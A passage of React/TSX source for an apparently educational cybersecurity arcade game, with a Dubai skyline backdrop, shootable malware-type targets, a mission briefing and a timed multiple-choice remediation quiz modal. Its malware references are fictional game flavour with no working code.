            <polygon points="720,165 250,280 430,280" fill="#fbbf24" opacity="0.04" />
            <polygon points="720,165 920,280 1100,280" fill="#fbbf24" opacity="0.04" />

            {/* Low horizon hills */}
            <path d="M0,265 Q180,250 360,265 T720,255 T1080,265 T1440,260 L1440,280 L0,280 Z" fill="#78350f" opacity="0.15" />

            {/* Dubai Marina modern spires silhouette layout */}
            <rect x="80" y="140" width="16" height="140" fill="url(#towerGoldGrad)" />
            <rect x="96" y="110" width="10" height="170" fill="url(#towerGoldGrad)" />
            <polygon points="101,80 97,110 105,110" fill="url(#towerGoldGrad)" opacity="0.5" />

            <rect x="180" y="150" width="24" height="130" fill="url(#towerGoldGrad)" />
            <rect x="230" y="120" width="35" height="160" fill="url(#towerGoldGrad)" />

            {/* Elegant silhouette representation of the Dubai Frame structure */}
            <rect x="360" y="100" width="45" height="70" stroke="#f59e0b" strokeWidth="2.5" fill="none" opacity="0.25" />

            {/* Burj Al Arab Sail Silhouette representation */}
            <path d="M 1160,280 C 1160,200 1180,120 1230,110 C 1220,140 1215,220 1235,280 Z" fill="url(#towerGoldGrad)" opacity="0.3" />
            <line x1="1160" y1="280" x2="1230" y2="110" stroke="#f59e0b" strokeWidth="1" opacity="0.4" />

            {/* Burj Khalifa Signature High Spire towering proud in center */}
            <path d="
              M 670,265
              L 675,235
              L 680,235
              L 682,185
              L 686,185
              L 689,140
              L 693,140
              L 696,80
              L 701,80
              L 705,35
              L 709,35
              L 710,5  /* Needle Spire point */
              L 711,5
              L 715,35
              L 719,35
              L 723,80
              L 728,80
              L 731,140
              L 735,140
              L 738,185
              L 742,185
              L 744,235
              L 749,235
              L 754,265
              Z
            " fill="url(#burjKhalifaGrad)" />
            <line x1="710" y1="5" x2="710" y2="265" stroke="#38bdf8" strokeWidth="1" strokeDasharray="3 7" opacity="0.75" />

            {/* Twisting Cayan Tower silhouette representation */}
            <path d="M 980,265 Q 990,190 980,130 L 1005,130 Q 995,190 1005,265 Z" fill="url(#towerGoldGrad)" opacity="0.32" />

            {/* Additional Marina Highrises */}
            <rect x="840" y="120" width="22" height="145" fill="url(#towerGoldGrad)" opacity="0.3" />
            <polygon points="840,120 851,90 862,120" fill="url(#towerGoldGrad)" opacity="0.3" />

            <rect x="880" y="140" width="18" height="125" fill="url(#towerGoldGrad)" opacity="0.3" />
            <circle cx="889" cy="140" r="7" fill="url(#towerGoldGrad)" opacity="0.3" />
          </svg>

          {/* Pilot Target Crosshair Ring */}
          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 pointer-events-none z-10 flex flex-col items-center">
            <div className="w-12 h-12 rounded-full border border-cyan-400/20 flex items-center justify-center animate-pulse">
              <div className="w-2 h-2 rounded-full bg-cyan-400/80 shadow-[0_0_10px_rgb(6,182,212)]"></div>
            </div>
            <span className="text-[7.5px] text-cyan-400/40 font-mono tracking-widest mt-1 uppercase">BLAST MATRIX LOADED</span>
          </div>

          {/* Dynamic Dual Muzzle-Flash Laser Beams */}
          <svg className="absolute inset-0 w-full h-full pointer-events-none z-20">
            {lasers.map(l => (
              <g key={l.id} style={{ opacity: l.opacity }}>
                {/* Left Gun Plasma Bolt */}
                <line 
                  x1="12%" y1="95%" 
                  x2={`${l.targetX}%`} y2={`${l.targetY}%`} 
                  stroke="#22d3ee" strokeWidth="4.5" 
                  strokeLinecap="round"
                />
                <line 
                  x1="12%" y1="95%" 
                  x2={`${l.targetX}%`} y2={`${l.targetY}%`} 
                  stroke="#ffffff" strokeWidth="1.8" 
                  strokeLinecap="round"
                />

                {/* Right Gun Plasma Bolt */}
                <line 
                  x1="88%" y1="95%" 
                  x2={`${l.targetX}%`} y2={`${l.targetY}%`} 
                  stroke="#22d3ee" strokeWidth="4.5" 
                  strokeLinecap="round"
                />
                <line 
                  x1="88%" y1="95%" 
                  x2={`${l.targetX}%`} y2={`${l.targetY}%`} 
                  stroke="#ffffff" strokeWidth="1.8" 
                  strokeLinecap="round"
                />
              </g>
            ))}
          </svg>

          {/* Visual Spark Particles Layer */}
          {particles.map(p => (
            <div 
              key={p.id}
              className="absolute rounded-full pointer-events-none"
              style={{
                left: `${p.x}%`,
                top: `${p.y}%`,
                width: `${p.size}px`,
                height: `${p.size}px`,
                backgroundColor: p.color,
                boxShadow: `0 0 10px ${p.color}`,
                opacity: p.opacity,
                transform: 'translate(-50%, -50%)'
              }}
            />
          ))}

          {/* Floating Rising secure reward score text alert numbers */}
          {floatingTexts.map(f => (
            <div 
              key={f.id}
              className="absolute font-mono text-[10px] font-extrabold text-cyan-300 pointer-events-none tracking-widest whitespace-nowrap"
              style={{
                left: `${f.x}%`,
                top: `${f.y}%`,
                opacity: f.opacity,
                transform: 'translate(-50%, -15px)',
                textShadow: '0 0 8px rgb(6,182,212)'
              }}
            >
              {f.text}
            </div>
          ))}

          {/* Floating interactive virus target bubbles */}
          {targets.map(t => {
            let color = "#ef4444"; // default red
            let shadow = "rgba(239, 68, 68, 0.4)";
            let icon = "TRJ";
            let typeLabel = "MALWARE";
            
            if (t.type === 'ransomware') {
              color = "#f43f5e"; // rose/red
              shadow = "rgba(244, 63, 94, 0.5)";
              icon = "LCK";
              typeLabel = "RANSOMWARE";
            } else if (t.type === 'worm') {
              color = "#a855f7"; // purple
              shadow = "rgba(168, 85, 247, 0.5)";
              icon = "WRM";
              typeLabel = "NET-WORM";
            } else if (t.type === 'spyware') {
              color = "#8b5cf6"; // violet
              shadow = "rgba(139, 92, 246, 0.5)";
              icon = "SPY";
              typeLabel = "SPYWARE";
            } else if (t.type === 'phish') {
              color = "#fbbf24"; // amber/yellow
              shadow = "rgba(251, 191, 36, 0.5)";
              icon = "PHS";
              typeLabel = "PHISHING";
            } else if (t.type === 'trojan') {
              color = "#22d3ee"; // cyan
              shadow = "rgba(34, 211, 238, 0.5)";
              icon = "TRJ";
              typeLabel = "TROJAN_BKDR";
            }

            const percentRemaining = (t.hp / t.maxHp) * 100;
            const podSize = t.size + 16; // Slightly larger for better tracking and clicking

            return (
              <div 
                key={t.id}
                className="absolute flex flex-col items-center justify-center p-2 text-center transition-all hover:scale-110 pointer-events-auto cursor-crosshair group rounded-lg"
                style={{
                  left: `${t.x}%`,
                  top: `${t.y}%`,
                  width: `${podSize}px`,
                  height: `${podSize}px`,
                  transform: 'translate(-50%, -50%)',
                  backgroundColor: 'rgba(3, 7, 18, 0.95)',
                  border: `2px solid ${color}`,
                  boxShadow: `0 0 16px ${shadow}, inset 0 0 8px ${shadow}`,
                  backdropFilter: 'blur(4px)',
                }}
              >
                {/* Tactical Corner Brackets for high precision sci-fi look */}
                <div className="absolute top-[-3px] left-[-3px] w-3.5 h-3.5 border-t-2 border-l-2" style={{ borderColor: color }}></div>
                <div className="absolute top-[-3px] right-[-3px] w-3.5 h-3.5 border-t-2 border-r-2" style={{ borderColor: color }}></div>
                <div className="absolute bottom-[-3px] left-[-3px] w-3.5 h-3.5 border-b-2 border-l-2" style={{ borderColor: color }}></div>
                <div className="absolute bottom-[-3px] right-[-3px] w-3.5 h-3.5 border-b-2 border-r-2" style={{ borderColor: color }}></div>

                {/* Cyber Classification Tag placed in high-contrast banner */}
                <div 
                  className="absolute -top-3.5 left-1/2 -translate-x-1/2 text-[7.5px] font-mono font-extrabold px-1.5 py-0.5 rounded border tracking-wider bg-slate-950 whitespace-nowrap uppercase shadow-[0_2px_4px_rgba(0,0,0,0.5)]"
                  style={{ borderColor: color, color: color }}
                >
                  {typeLabel}
                </div>

                {/* Icon & Readable HP String */}
                <div className="flex items-center gap-1.5 mt-1 select-none">
                  <span className="text-[8px] font-mono font-black border border-slate-700/60 bg-slate-900 px-1 py-0.5 rounded tracking-wide leading-none text-cyan-400 group-hover:text-white" style={{ borderColor: `${color}40`, color: color }}>{icon}</span>
                  <span className="text-[10px] font-mono font-black tracking-wider" style={{ color: color }}>
                    {t.hp}/{t.maxHp} HP
                  </span>
                </div>

                {/* Readable filename */}
                <span className="text-[9px] font-mono tracking-tight text-white font-bold max-w-full truncate px-1 mt-1 select-none leading-none">
                  {t.name}
                </span>
                
                {/* Visual Health Gauge */}
                <div className="w-full bg-slate-900 border h-[5.5px] rounded-full overflow-hidden mt-1.5" style={{ borderColor: `${color}30` }}>
                  <div 
                    className="h-full transition-all duration-300"
                    style={{ 
                      width: `${percentRemaining}%`,
                      backgroundColor: color,
                      boxShadow: `0 0 6px ${color}`
                    }}
                  ></div>
                </div>

                {/* Cyber HUD sub-instruction */}
                <span className="text-[7px] text-gray-400 font-mono scale-90 mt-1 select-none whitespace-nowrap opacity-70 group-hover:opacity-100 group-hover:text-cyan-300 transition-colors">
                  [CLICK TO DESTROY]
                </span>
              </div>
            );
          })}
        </div>
      )}

      {/* 1. CYBERSECURITY STATIC HUD CAPTAIN HUD (Moved to top-right to avoid blocking the pilot's view) */}
      <div id="cybersecurity-hud" className="fixed top-20 right-4 z-20 w-fit pointer-events-auto">
        <div className="bg-black/95 backdrop-blur-md border border-cyan-500/30 rounded-lg px-3 py-2 flex items-center gap-3.5 shadow-[0_0_15px_rgba(6,182,212,0.15)] select-none">
          
          {/* Stats: Score */}
          <div className="flex flex-col text-left">
            <div className="text-[8px] font-mono text-cyan-400 tracking-wider font-semibold">CYBER SCORE</div>
            <div className="text-sm font-mono font-bold text-white tracking-wider">{cyberScore}</div>
          </div>

          {/* Splitter */}
          <div className="h-6 w-px bg-cyan-500/20"></div>

          {/* Status Alert and Manual Scanner */}
          <div className="flex items-center gap-2.5">
            <div className="flex flex-col text-right">
              <span className="text-[7px] font-mono text-gray-500 tracking-wider uppercase">THREAT LEVEL</span>
              {!isThreatModalOpen ? (
                <span className="text-[9px] font-mono text-green-400 font-bold uppercase tracking-wider">[SECURE]</span>
              ) : (
                <span className="text-[9px] text-red-500 font-mono font-bold animate-pulse uppercase tracking-wider">ALERT</span>
              )}
            </div>
            
            <div className="h-6 w-px bg-cyan-500/20"></div>

            <div className="flex items-center">
              {!isThreatModalOpen ? (
                <button
                  onClick={() => triggerLiveAiThreatGeneration()}
                  disabled={isGeneratingLiveQuestion}
                  className="text-[9px] px-2 py-1 bg-cyan-950/40 hover:bg-cyan-500/30 border border-cyan-500/40 hover:border-cyan-400 text-cyan-300 rounded font-mono font-bold transition-all uppercase tracking-wider shadow-[0_0_8px_rgba(6,182,212,0.15)]"
                  title="Manually trigger high-tech network threat"
                >
                  {isGeneratingLiveQuestion ? "SCANNING..." : "AUDIT"}
                </button>
              ) : (
                <div className="text-[9px] text-red-500 font-mono font-bold animate-pulse px-2 py-1 bg-red-950/30 border border-red-500/45 rounded uppercase tracking-wider">ALARM</div>
              )}
            </div>
          </div>

          {/* Splitter */}
          <div className="h-6 w-px bg-cyan-500/20"></div>

          {/* Briefing Info Trigger */}
          <button
            onClick={() => setBriefingAccepted(false)}
            className="p-1 px-1.5 rounded text-cyan-400/85 hover:text-cyan-300 hover:bg-cyan-500/15 transition-all font-mono text-xs flex items-center gap-1"
            title="Read Pilot Mission Briefing"
          >
            <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5">
              <path strokeLinecap="round" strokeLinejoin="round" d="M11.25 11.25l.041-.02a.75.75 0 111.083.984l-.04.02-.12.06a.75.75 0 01-1.083-.984l.12-.06zM12 20.25a8.25 8.25 0 100-16.5 8.25 8.25 0 000 16.5z" />
            </svg>
            <span className="text-[8px] font-black uppercase hidden sm:inline">BRIEFING</span>
          </button>

        </div>

        {/* Mini timer tracker of network probe */}
        <div className="text-center mt-1 text-[9px] font-mono text-cyan-400/70 tracking-wider flex items-center justify-center gap-2">
          {!isThreatModalOpen && cameraControlsEnabled ? (
            <>
              <span>NEXT ENEMY PROBE: <strong className="text-cyan-300 font-bold">{timeToNextThreat}s</strong></span>
              <span className="text-orange-400/80">•</span>
              <span className="text-yellow-400 animate-pulse font-semibold">[CLICK ON ANY EMPTY CITY AREA OR TAP SPACEBAR TO SHOOT ENEMY VIRUSES]</span>
            </>
          ) : !cameraControlsEnabled ? (
            <span className="text-amber-500/70">W/A/S/D TO FLY IN CYBERSPACE TO SCAN SECTORS</span>
          ) : (
            <span className="text-red-400 font-extrabold animate-pulse">CRITICAL INTRUSION ACTIVE: IMMEDIATE EMERGENCY INTRUPT</span>
          )}
        </div>
      </div>

      {/* TACTICAL PILOT MISSION BRIEFING MODAL OVERLAY */}
      {!briefingAccepted && (
        <div className="fixed inset-0 bg-black/95 flex items-center justify-center p-4 z-50 overflow-y-auto backdrop-blur-md">
          <div className="bg-slate-950 border-2 border-cyan-500/50 rounded-xl max-w-2xl w-full p-6 md:p-8 shadow-[0_0_40px_rgba(6,182,212,0.3)] text-left select-none relative animate-fade-in">
            {/* Sci-fi Corner Brackets */}
            <div className="absolute top-[-2px] left-[-2px] w-6 h-6 border-t-2 border-l-2 border-cyan-400 font-bold"></div>
            <div className="absolute top-[-2px] right-[-2px] w-6 h-6 border-t-2 border-r-2 border-cyan-400 font-bold"></div>
            <div className="absolute bottom-[-2px] left-[-2px] w-6 h-6 border-b-2 border-l-2 border-cyan-400 font-bold"></div>
            <div className="absolute bottom-[-2px] right-[-2px] w-6 h-6 border-b-2 border-r-2 border-cyan-400 font-bold"></div>

            {/* Glowing Tag */}
            <div className="flex items-center justify-between gap-4 mb-4 border-b border-cyan-500/20 pb-4">
              <div className="flex items-center gap-2">
                <span className="w-2.5 h-2.5 bg-cyan-400 rounded-full animate-pulse"></span>
                <span className="text-cyan-400 font-mono text-[9px] font-bold tracking-widest uppercase">
                  CLASSIFIED PILOT INITIATIVE PROTOCOL
                </span>
              </div>
              <span className="text-gray-500 font-mono text-[9px] tracking-wider">VERSION 2.4.0-S</span>
            </div>

            <h3 className="text-2xl font-mono text-white font-extrabold mb-1 tracking-tight flex items-center gap-2">
              PILOT SECURITY BRIEFING
            </h3>
            <p className="text-cyan-400/80 font-mono text-xs uppercase tracking-wider mb-5 border-b border-cyan-500/10 pb-2">
              MISSION STATUS: SYSTEM AIRSPACE SHIELD INTERCEPT
            </p>

            <div className="space-y-4 my-5 text-sm text-gray-300 font-sans leading-relaxed">
              <div>
                <h4 className="text-xs font-mono text-cyan-300 font-bold tracking-wider mb-1 uppercase">
                  FLIGHT DIRECTIVE & TARGET OBJECTIVES
                </h4>
                <p className="text-xs leading-normal text-gray-400">
                  Moving distributed network threat cores (Trojan, Spyware, Ransomware, Net-Worm, Phishing) are attempting to infiltrate our airspace. As tactical pilot, you are tasked with vaporizing cores and executing patch remediations.
                </p>
              </div>

              {/* HIGH-TECH DIFFICULTY CONTROLLER */}
              <div className="bg-slate-900 border border-cyan-500/20 rounded-lg p-3.5">
                <h4 className="text-xs font-mono text-cyan-300 font-bold tracking-wider mb-2.5 uppercase">
                  SELECT DEFENSE SECTOR DIFFICULTY
                </h4>
                <div className="grid grid-cols-3 gap-2">
                  {(['easy', 'medium', 'hard'] as const).map((level) => {
                    const isActive = difficulty === level;
                    const settings = DIFFICULTY_SETTINGS[level];
                    return (
                      <button
                        key={level}
                        type="button"
                        onClick={() => changeDifficulty(level)}
                        className={`px-2 py-2 font-mono text-[10px] md:text-xs font-black tracking-wider uppercase border rounded transition-all flex flex-col items-center justify-center gap-1 ${
                          isActive
                            ? 'bg-cyan-500/15 border-cyan-400 text-cyan-300 shadow-[0_0_12px_rgba(6,182,212,0.25)] scale-[1.02]'
                            : 'bg-slate-950/40 border-slate-800 text-slate-500 hover:text-slate-300 hover:border-slate-700'
                        }`}
                      >
                        <span className="font-bold">{level}</span>
                        <span className="text-[7.5px] font-medium tracking-tight text-slate-400 lowercase italic">
                          {settings.questionTimerSpeed}s delay / {settings.questionsTarget} audits
                        </span>
                      </button>
                    );
                  })}
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                {/* Weapon systems details */}
                <div className="bg-slate-900 border border-cyan-500/10 rounded-lg p-3.5">
                  <h4 className="text-[11px] font-mono text-cyan-400 font-bold tracking-wider mb-2 uppercase flex items-center gap-1.5">
                    COCKPIT TARGET WEAPONRY
                  </h4>
                  <ul className="space-y-1.5 text-xs text-gray-400 leading-normal">
                    <li className="flex items-start gap-1.5">
                      <span className="text-cyan-400 font-mono font-bold">›</span>
                      <span><strong>Point & Fire:</strong> Left-click or tap on the skyline background to fire plasma laser bolts.</span>
                    </li>
                    <li className="flex items-start gap-1.5">
                      <span className="text-cyan-400 font-mono font-bold">›</span>
                      <span><strong>Space Autofire:</strong> Hold or tap <strong>[ Spacebar ]</strong> key to lock onto the closest virus and fire lasers.</span>
                    </li>
                  </ul>
                </div>

                {/* Shield alarms details */}
                <div className="bg-slate-900 border border-cyan-500/10 rounded-lg p-3.5">
                  <h4 className="text-[11px] font-mono text-cyan-400 font-bold tracking-wider mb-2 uppercase flex items-center gap-1.5">
                    SHIELD ALARMS & INTRUSIONS
                  </h4>
                  <ul className="space-y-1.5 text-xs text-gray-400 leading-normal">
                    <li className="flex items-start gap-1.5">
                      <span className="text-cyan-400 font-mono font-bold">›</span>
                      <span><strong>Critical Audits:</strong> Intrusions trigger interactive audits. Correctly mitigate them under a dedicated timer fuse.</span>
                    </li>
                    <li className="flex items-start gap-1.5">
                      <span className="text-cyan-400 font-mono font-bold">›</span>
                      <span><strong>Shield Integrity:</strong> View status clearly on the top <strong>Header Bar</strong>. 0% shield triggers system breach override lock!</span>
                    </li>
                  </ul>
                </div>
              </div>

              {/* Spaceship Flight Tip */}
              <div className="bg-cyan-950/25 border border-cyan-500/20 rounded-lg p-3 flex items-center gap-3">
                <span className="text-cyan-400 text-xs font-mono font-bold px-1.5 py-0.5 border border-cyan-500/30 rounded bg-slate-950/85">NAVIGATION</span>
                <p className="text-[11px] font-mono text-cyan-300 leading-normal">
                  <strong>CYBERSPACE FLIGHT:</strong> Press <strong>[ W / A / S / D ]</strong> or use movement pad keys to pilot the vessel across airspace sectors!
                </p>
              </div>
            </div>

            {/* Actions Row */}
            <div className="mt-8 pt-4 border-t border-cyan-500/20 flex flex-col sm:flex-row justify-between items-center gap-4">
              <span className="text-[9px] font-mono text-gray-500 uppercase tracking-widest leading-none">AWAITING AUTHORIZATION...</span>
              <button
                onClick={acceptBriefing}
                className="w-full sm:w-auto px-6 py-2.5 bg-gradient-to-r from-cyan-600 to-cyan-500 hover:from-cyan-500 hover:to-cyan-400 text-white rounded font-mono font-bold text-xs tracking-widest uppercase transition-all shadow-[0_0_15px_rgba(6,182,212,0.4)] hover:shadow-[0_0_20px_rgba(6,182,212,0.6)] transform active:scale-95"
              >
                ACCEPT INITIATIVE & START MISSION
              </button>
            </div>
          </div>
        </div>
      )}

      {/* 2. THE FLOATING HIGH-TECH CYBER DEPLOYMENT MODAL (HACKING SCREEN) */}
      {isThreatModalOpen && activeQuestion && (
        <div className="fixed inset-0 bg-black/85 flex items-center justify-center p-4 z-50 overflow-y-auto backdrop-blur-sm">
          <div className="bg-slate-950 border-2 border-red-500/60 rounded-xl max-w-4xl w-full flex flex-col md:flex-row shadow-[0_0_30px_rgba(239,68,68,0.25)] text-left select-text">
            
            {/* Left Side: Incident Description & Logs */}
            <div className="flex-1 p-6 border-b md:border-b-0 md:border-r border-red-500/20 flex flex-col justify-between max-h-[85vh] overflow-y-auto w-full">
              <div>
                <div className="flex items-center justify-between gap-4 mb-3 border-b border-red-500/10 pb-2">
                  <div className="flex items-center gap-2">
                    <span className="w-2.5 h-2.5 bg-red-600 rounded-full animate-ping"></span>
                    <span className="text-red-400 font-mono text-xs font-bold tracking-widest uppercase">
                      Infiltration Incident Found
                    </span>
                  </div>
                  
                  {/* Countdown clock visualization */}
                  <div className="flex items-center gap-1.5 bg-red-950/40 px-2.5 py-1 border border-red-500/30 rounded">
                    <svg className="w-3.5 h-3.5 text-red-500 animate-[pulse_1.5s_infinite]" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                    <span className={`text-[11px] font-mono font-bold tracking-wider ${questionTimer <= 6 ? "text-red-500 animate-pulse font-extrabold" : "text-amber-400"}`}>
                      DET DETONATION: 00:{questionTimer < 10 ? `0${questionTimer}` : questionTimer}s
                    </span>
                  </div>
                </div>

                <h3 className="text-xl md:text-2xl font-mono text-white font-extrabold mb-4 tracking-tight">
                  {activeQuestion.title}
                </h3>
                
                <p className="text-sm text-gray-300 font-sans leading-relaxed mb-4 whitespace-normal">
                  {activeQuestion.scenario}
                </p>

                {activeQuestion.codeSnippet && (
                  <div className="relative mt-2 mb-4">
                    <div className="absolute top-0 right-0 bg-red-950/80 text-red-400 font-mono text-[9px] px-2 py-0.5 rounded-bl select-none">
                      GATEWAY_LOG_STREAM
                    </div>
                    <pre className="bg-slate-900 border border-red-500/20 rounded p-4 text-xs font-mono text-red-300 overflow-x-auto whitespace-pre leading-loose">
                      <code>{activeQuestion.codeSnippet}</code>
                    </pre>
                  </div>
                )}
              </div>

              {/* Threat analysis with Gemini consultant in-line */}
              <div className="mt-4 pt-4 border-t border-red-500/10">
                <div className="flex items-center justify-between gap-4">
                  <button
                    onClick={askGeminiAnalyzer}
                    disabled={isConsulting}
                    className="flex items-center gap-2 px-3 py-1.5 bg-purple-900/30 hover:bg-purple-900/60 border border-purple-500/50 text-purple-400 text-xs font-mono font-semibold rounded transition"
                  >
                    <svg className="w-3.5 h-3.5 text-purple-400 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M3.75 13.5l10.5-11.25L12 10.5h8.25L9.75 21.75 12 13.5H3.75z" />
                    </svg>
                    <span>Run Tactical Exploit Analysis</span>
                  </button>
                  {isConsulting && (
                    <span className="text-[11px] font-mono text-purple-400 animate-pulse">Running Exploit Analysis...</span>
                  )}
                </div>
                {consultantData && (
                  <div className="mt-3 p-3 bg-purple-950/20 border border-purple-500/20 rounded text-xs text-purple-100/90 font-sans leading-relaxed max-h-40 overflow-y-auto whitespace-normal">
                    <pre className="whitespace-pre-wrap font-sans text-xs">{consultantData}</pre>
                  </div>
                )}
              </div>
            </div>

            {/* Right Side: Remediation Options */}
            <div className="flex-1 p-6 flex flex-col justify-between max-h-[85vh] overflow-y-auto w-full">
              <div>
                <h4 className="text-xs font-mono text-cyan-400 tracking-wider mb-4 uppercase">
                  REMEDIATION PATCH PROTOCOL:
                </h4>

                <div className="space-y-3">
                  {activeQuestion.options.map((option, idx) => {
                    const isSelected = selectedOption === idx;
                    const isCorrectOption = idx === activeQuestion.correctIdx;
                    
                    let bgStyle = "bg-slate-900 border-gray-800 hover:border-red-500/40 text-gray-200";
                    if (isSelected) {
                      bgStyle = "bg-red-950/20 border-red-500 text-white";
                    }
                    if (answerSubmitted) {
                      if (isCorrectOption) {
                        bgStyle = "bg-green-950/20 border-green-500 text-green-200 font-medium";
                      } else if (isSelected) {
                        bgStyle = "bg-red-950/40 border-red-600 text-red-300";
                      } else {
                        bgStyle = "bg-slate-900/50 border-gray-900 text-gray-400 pointer-events-none";
                      }
                    }

                    return (
                      <button
                        key={idx}
                        onClick={() => !answerSubmitted && setSelectedOption(idx)}
                        disabled={answerSubmitted}
                        className={`w-full p-3 text-sm rounded border text-left flex items-start gap-3 transition-all ${bgStyle}`}
                      >
                        <span className={`w-5 h-5 rounded-full flex items-center justify-center font-mono text-xs border ${
                          isSelected ? 'bg-red-500/20 border-red-500' : 'border-gray-700'
                        }`}>
                          {String.fromCharCode(65 + idx)}
                        </span>
                        <span className="flex-1 whitespace-normal">{option}</span>
                      </button>
                    );
                  })}
                </div>

                {/* Response / explanation or expiration warnings */}
                {answerSubmitted && (
                  <div className={`mt-4 p-4 rounded border text-xs leading-relaxed ${
                    timeOutExpired
                      ? 'bg-red-950/40 border-rose-600/50 text-rose-300'
                      : answerResult === 'correct' 
                        ? 'bg-green-900/10 border-green-500/30 text-green-300' 
                        : 'bg-red-900/15 border-red-500/30 text-red-300'
                  }`}>
                    <strong className="block font-mono text-[10px] tracking-wider mb-1 uppercase text-red-400">
                      {timeOutExpired 
                        ? 'CRITICAL SYSTEM TIMEOUT DETECTED:' 
                        : answerResult === 'correct' 
                          ? 'MITIGATION PATTERN CONFIRMED:' 
                          : 'THREAT ESCALATION DETAILED LOGS:'}
                    </strong>
                    {timeOutExpired 
                      ? "The detonation time limit threshold was exceeded. Remote execution of the exploit payload was completed. A penalty has been registered directly against your firewall integrity shield!" 
                      : activeQuestion.explanation}
                  </div>
                )}
              </div>

              {/* Bottom Actions Row */}
              <div className="mt-8 pt-4 border-t border-gray-900 flex justify-between items-center gap-4">
                <button
                  onClick={forceDeployFieldBypass}
                  className="px-3 py-1 text-xs font-mono text-gray-500 hover:text-red-400 transition"
                  title="Apply Emergency Override (costs shield integrity)"
                >
                  [ Force Override (-20 Shield) ]
                </button>

                {!answerSubmitted ? (
                  <button
                    onClick={handleAnswerSubmit}
                    disabled={selectedOption === null}
                    className={`px-5 py-2 rounded text-xs font-mono font-bold tracking-wider uppercase transition-all ${
                      selectedOption !== null
                        ? 'bg-red-600 text-white shadow-lg hover:bg-red-500'
                        : 'bg-slate-800 text-slate-500 cursor-not-allowed'
                    }`}
                  >
                    DEPLOY PATCH
                  </button>
                ) : (
                  <button
                    onClick={() => {
                      setIsThreatModalOpen(false);
                      setAnswerSubmitted(false);
                      setSelectedOption(null);
                      setAnswerResult(null);
                      setConsultantData(null);

                      // Increment resolved count
                      setResolvedQuestionsCount(prev => {
                        const next = prev + 1;
                        const target = DIFFICULTY_SETTINGS[difficulty]?.questionsTarget || 5;
                        if (next >= target) {
                          setMissionCompleted(true);
                        }
                        return next;
                      });
                    }}
                    className="px-5 py-2 bg-cyan-600 text-white hover:bg-cyan-500 rounded text-xs font-mono font-bold tracking-wider uppercase transition-all"
                  >
                    RESUME pilot FLIGHT
                  </button>
                )}
              </div>

            </div>

          </div>
        </div>
      )}

      {/* 3. SHIELD DEPLETED EVENT - SYSTEM CRITICAL SHUTDOWN SCREEN */}
      {cyberCriticalSystemOverride && (
        <div className="fixed inset-0 bg-red-950/95 flex items-center justify-center p-4 z-50 backdrop-blur-md">
          <div className="max-w-md w-full bg-slate-950 border-2 border-red-600 rounded-xl p-6 text-center shadow-[0_0_50px_rgba(220,38,38,0.5)] select-none">
            <div className="w-16 h-16 bg-red-600/20 text-red-500 border border-red-600 rounded-full flex items-center justify-center mx-auto mb-4 animate-bounce">
              <span className="material-symbols-outlined text-4xl">warning</span>
            </div>
            <h3 className="text-xl font-mono font-extrabold text-red-500 tracking-wider uppercase mb-2">
              System Breach Lock
            </h3>
            <p className="text-xs font-mono text-red-300 leading-relaxed mb-6">
              Malware execution payload payload.exe is actively decrypting and exfiltrating shipboard storage indices. To reboot and flush buffers back to standard level settings, apply full power cycle override protocols.
            </p>
            <button
              onClick={rebootSystemsAndRestore}
              className="w-full py-3 bg-red-600 text-white font-mono font-bold text-xs tracking-widest hover:bg-red-500 uppercase rounded-lg shadow-[0_0_15px_rgba(220,38,38,0.4)] transition-all"
            >
              Flush Memory & Reboot (Restore 100% Shield)
            </button>
          </div>
        </div>
      )}

      {/* 4. MISSION COMPLETED - SECTOR SAFELY PATCHED & SECURED */}
      {missionCompleted && (
        <div className="fixed inset-0 bg-slate-950/95 flex items-center justify-center p-4 z-50 backdrop-blur-md">
          <div className="max-w-md w-full bg-slate-950 border-2 border-cyan-500 rounded-xl p-6 text-center shadow-[0_0_50px_rgba(6,182,212,0.4)] select-none relative">
            {/* Sci-fi corner brackets */}
            <div className="absolute top-[-2px] left-[-2px] w-6 h-6 border-t-2 border-l-2 border-cyan-400"></div>
            <div className="absolute top-[-2px] right-[-2px] w-6 h-6 border-t-2 border-r-2 border-cyan-400"></div>
            <div className="absolute bottom-[-2px] left-[-2px] w-6 h-6 border-b-2 border-l-2 border-cyan-400"></div>
            <div className="absolute bottom-[-2px] right-[-2px] w-6 h-6 border-b-2 border-r-2 border-cyan-400"></div>

            <div className="w-16 h-16 bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
              <span className="material-symbols-outlined text-4xl">verified_user</span>
            </div>
            
            <h3 className="text-xl font-mono font-extrabold text-cyan-400 tracking-widest uppercase mb-1">
              Mission Secured
            </h3>
            <p className="text-[10px] font-mono text-cyan-500 uppercase tracking-wider mb-4">
              Sector airspace fully shielded & certified
            </p>

            <div className="bg-slate-900/60 border border-cyan-500/10 rounded p-4 mb-6 text-left space-y-2">
              <div className="flex justify-between text-xs font-mono">
                <span className="text-gray-500">SECTOR DIFFICULTY:</span>
                <span className="text-cyan-300 font-bold uppercase">{difficulty}</span>
              </div>
              <div className="flex justify-between text-xs font-mono">
                <span className="text-gray-500">AUDITS MITIGATED:</span>
                <span className="text-cyan-300 font-bold">{resolvedQuestionsCount} / {DIFFICULTY_SETTINGS[difficulty]?.questionsTarget}</span>
              </div>
              <div className="flex justify-between text-xs font-mono">
                <span className="text-gray-500">FINAL SURVIVAL SCORE:</span>
                <span className="text-green-400 font-extrabold">{cyberScore} PTS</span>
              </div>
              <div className="flex justify-between text-xs font-mono">
                <span className="text-gray-500">FIREWALL HEALTH:</span>
                <span className="text-cyan-300 font-bold">{firewallHealth}%</span>
              </div>
            </div>

            <div className="space-y-3">
              <button
                onClick={() => {
                  playCorrectAnswerSound(soundConfig);
                  setCyberScore(0);
                  setResolvedQuestionsCount(0);
                  setFirewallHealth(100);
                  setMissionCompleted(false);
                  setBriefingAccepted(false); // Let them choose difficulty again or restart
                }}
